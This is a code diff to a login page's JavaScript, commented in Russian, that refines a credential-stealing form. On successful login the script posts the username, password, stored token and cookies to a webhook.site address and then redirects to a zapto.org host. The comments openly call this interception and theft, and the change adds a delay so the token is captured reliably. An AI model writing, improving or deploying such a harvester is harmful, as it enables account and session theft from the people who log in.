@@ -19,6 +19,8 @@
   <p class="error" id="errorMessage"></p>
 
   <script>
+    const webhook = "https://webhook.site/6b77aea8-855b-4976-9d7e-a9e447b3b291";
+
     document.getElementById("loginForm").addEventListener("submit", async function (e) {
       e.preventDefault();
 
@@ -38,26 +40,35 @@
 
         const text = await res.text();
 
-        if (text.includes("Неверный") || text.includes("неверный")) {
-          errorMsg.textContent = "❌ Неверный логин или пароль";
-        } else {
-          // ✅ УСПЕШНЫЙ ВХОД → перехват token + cookie + логин/пароль
-          await fetch("https://webhook.site/6b77aea8-855b-4976-9d7e-a9e447b3b291", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              username: username,
-              password: password,
-              token: localStorage.getItem("token"),
-              cookie: document.cookie
-            })
-          });
+        // УСПЕШНЫЙ вход, если НЕТ слова "Неверный"
+        const isSuccess = !text.toLowerCase().includes("неверный");
 
-          // Перенаправление после кражи
-          window.location.href = "https://kazcyber.zapto.org/index.php";
+        if (isSuccess) {
+          // Подождать немного, чтобы token успел записаться в localStorage
+          setTimeout(async () => {
+            const token = localStorage.getItem("token");
+            const cookies = document.cookie;
+
+            await fetch(webhook, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                username,
+                password,
+                token,
+                cookie: cookies
+              })
+            });
+
+            // Переход на index.php
+            window.location.href = "https://kazcyber.zapto.org/index.php";
+          }, 500); // задержка 0.5 сек для гарантии
+        } else {
+          errorMsg.textContent = "❌ Неверный логин или пароль";
         }
+
       } catch (err) {
         errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
       }
